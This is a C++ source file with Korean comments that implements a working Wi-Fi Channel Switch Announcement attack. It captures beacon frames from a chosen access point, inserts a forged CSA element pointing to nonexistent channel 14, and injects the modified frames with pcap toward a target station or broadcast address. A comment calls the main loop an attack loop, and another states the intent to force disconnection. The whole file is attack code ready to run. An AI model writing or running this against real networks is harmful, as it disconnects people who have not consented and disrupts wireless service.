#include <pch.h>
#include <dot11.h>
#include <mac.h>
#include <radiotap.h>
#include <param.h>
#include <utils.h>
#include <sstream>

using namespace std;
Param param;

int main(int argc, char *argv[]) {
    if (!Param::parse(&param, argc, argv)){
        Param::usage();
        return -1;
    }

    log_init();
    log_write("Start | iface=" + param.dev_ + " ap=" + param.ap_mac_ 
            + " station=" + (param.station_mac_.empty() ? "broadcast" : param.station_mac_));

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_.c_str(), errbuf);
        log_write("ERROR: pcap_open_live failed - " + string(errbuf));
        return -1;
    }

    // MAC 객체 생성 (문자열 -> 바이트 배열 변환)
    Mac ap_mac(param.ap_mac_);
    Mac station_mac;
    bool is_broadcast = false;

    if (!param.station_mac_.empty()) {
        station_mac = Mac(param.station_mac_);
    } else {
        // 단말기가 지정되지 않으면 브로드캐스트 주소로 설정
        station_mac = Mac("ff:ff:ff:ff:ff:ff");
        is_broadcast = true;
    }

    // 변환된 MAC 주소 확인
    Param::print_param(param);

    // 공격 루프
    int count = 0;
    while (true) {
        struct pcap_pkthdr* header;
        const uint8_t* packet;

        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;   // timeout
        if (res < 0) break;       // error

        // Radiotap 헤더 길이 파악
        uint16_t rt_len = ((RadioTapHdr*)packet)->get_len();
        int min_len = rt_len + (int)sizeof(Dot11Hdr) + (int)sizeof(BeaconHdr::Fix);
        if ((int)header->caplen < min_len) continue;

        const BeaconHdr* beacon = (const BeaconHdr*)(packet + rt_len);

        // Beacon 프레임 확인
        if (!beacon->is_beacon()) continue;

        // AP MAC 필터 (addr_2 = Source Address = BSSID in beacon)
        if (!Mac_compare(beacon->addr_2, ap_mac)) continue;

        {
            ostringstream oss;
            oss << "Beacon #" << ++count << " captured | AP=" << ap_mac.to_string()
                << " len=" << header->caplen;
            log_write(oss.str());
        }

        

        // Tagged Parameter 범위 (FCS 마지막 4바이트 제외)
        const uint8_t* tags_start = (const uint8_t*)beacon->first_tag();
        const uint8_t* tags_end_ptr = packet + (int)header->caplen - 4;

        // CSA IE: Tag=37, Length=3, [Mode=1, NewChannel=14, Count=1]
        // Mode=1: 채널 전환까지 현재 채널 송신 중단
        // NewChannel=14: 실제로 존재하지 않는 채널 → 연결 해제 유도
        // Count=1: 즉시 전환
        uint8_t csa_ie[] = {37, 3, 1, 14, 1};
        bool csa_inserted = false;

        // Tag Number 기준 정렬 유지하며 CSA IE 삽입
        vector<uint8_t> new_tags;
        const uint8_t* p = tags_start;

        while (p < tags_end_ptr && p + 2 <= tags_end_ptr) {
            uint8_t tag_num = p[0];
            uint8_t tag_len = p[1];

            if (!csa_inserted && tag_num >= 37) {
                if (tag_num == 37) {
                    // 기존 CSA 태그 제거 (중복 방지)
                    p += 2 + tag_len;
                    continue;
                }
                new_tags.insert(new_tags.end(), csa_ie, csa_ie + sizeof(csa_ie));
                csa_inserted = true;
            }

            if (p + 2 + (int)tag_len > tags_end_ptr) break;
            new_tags.insert(new_tags.end(), p, p + 2 + tag_len);
            p += 2 + tag_len;
        }

        // 모든 태그 번호가 37 미만이었던 경우 맨 끝에 삽입
        if (!csa_inserted) {
            new_tags.insert(new_tags.end(), csa_ie, csa_ie + sizeof(csa_ie));
        }

        // 새 패킷 조립: [Radiotap][Dot11Hdr+Fix][수정된 Tagged Params]
        int fixed_hdr_len = (int)(tags_start - (packet + rt_len));
        vector<uint8_t> new_packet;
        new_packet.insert(new_packet.end(), packet, packet + rt_len + fixed_hdr_len);
        new_packet.insert(new_packet.end(), new_tags.begin(), new_tags.end());

        // Destination 주소 (addr_1) 교체
        // Dot11Hdr 내 addr_1 오프셋: subtype_(1) + ver_type_(1) + duration_id_(2) = 4
        int addr1_offset = rt_len + 4;
        memcpy(new_packet.data() + addr1_offset, station_mac.get_addr(), 6);

        if (pcap_inject(pcap, new_packet.data(), new_packet.size()) < 0) {
            log_write("ERROR: pcap_inject failed - " + string(pcap_geterr(pcap)));
        } else {
            ostringstream oss;
            oss << "CSA sent | dst=" << station_mac.to_string()
                << " pkt_size=" << new_packet.size() << " ch=14";
            log_write(oss.str());
        }

        sleep(1);
    }

    pcap_close(pcap);
    return 0;
}
